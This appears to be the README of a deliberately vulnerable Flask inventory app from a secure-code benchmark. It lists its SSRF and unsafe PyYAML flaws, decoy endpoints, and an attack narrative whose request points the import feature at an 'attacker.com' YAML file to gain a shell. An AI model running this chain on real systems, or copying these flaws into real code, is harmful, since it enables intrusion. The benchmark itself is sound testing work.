# Supply Chain Inventory Tracker

## Overview
A Flask web application representing a supply chain inventory system, allowing operators and administrators to track warehouses, inventory levels, and import inventory records from supplier APIs.

## Business Domain
Logistics & Supply Chain Management

## Tech Stack
- Python 3.10
- Flask
- PyYAML 5.3.1 (Vulnerable Component)
- SQLite (in-memory)

## Features
- User login & session management
- Track warehouse information and capacity
- Update inventory levels (SKU, item name, quantity)
- Check supplier API health status
- Import inventory catalogs via remote YAML manifest URLs

## Security Benchmarking
The vulnerabilities in this application are intentional. Refer to [.vulns](file:///d:/work/secure-code-hunt/apps/python/app-25-supply-chain/.vulns) for the complete list of vulnerability targets.

---

## Chained Vulnerability Scenario

### Chain: "SSRF → YAML Deserialization → Lateral Movement"

An attacker uses an SSRF endpoint to query internal servers, and then points the inventory import feature to a malicious YAML file, executing remote code.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | SSRF endpoint fetches arbitrary internal URLs | Medium | A10 | `app.py` → `check_supplier_api()` |
| 2 | Unsafe `yaml.load()` on untrusted content | Medium | A06 | `app.py` → `import_inventory()` |

**Attack narrative**:
1. The attacker registers/authenticates as a normal operator.
2. The attacker uses the supplier API health check endpoint `/api/supplier/check-api?url=http://127.0.0.1:8095` to scan internal services or ports.
3. The attacker hosts a malicious YAML document (e.g. leveraging Python's `subprocess.Popen` or similar serialization gadgets) on an external or internal server.
4. The attacker sends a request to `/api/inventory/import` with `{"url": "http://attacker.com/malicious.yaml"}`.
5. The application makes an HTTP GET request to fetch the YAML file (SSRF), and feeds it to `yaml.load()` (unsafe deserialization).
6. The deserializer instantiates the gadget, executing arbitrary system commands on the application host.

**Combined Impact**: `lateral_movement` — The attacker executes remote commands and gains Shell access to the container/server.

---

## API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| POST   | `/api/auth/login` | None | Authenticate user and initialize session |
| POST   | `/api/auth/logout` | Session | Clear session |
| GET    | `/api/auth/me` | Session | Retrieve session info |
| GET    | `/api/supplier/check-api` | Session | Check supplier API health (vulnerable to SSRF) |
| POST   | `/api/inventory/import` | Session | Import inventory items from URL (vulnerable to unsafe PyYAML load) |
| POST   | `/api/config/load-local` | Admin | Parse local configuration file (Decoy: uses `yaml.safe_load`) |
| GET    | `/api/warehouses/<warehouse_id>` | Session | Retrieve warehouse stats (Decoy: parameterized SQL) |

## Running Locally

1. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Start the server:
   ```bash
   python app.py
   ```
3. The application runs on port `8095`.

## Running via Docker

1. Build the image:
   ```bash
   docker build -t app-25-supply-chain .
   ```
2. Run the container:
   ```bash
   docker run -p 8095:8095 app-25-supply-chain
   ```
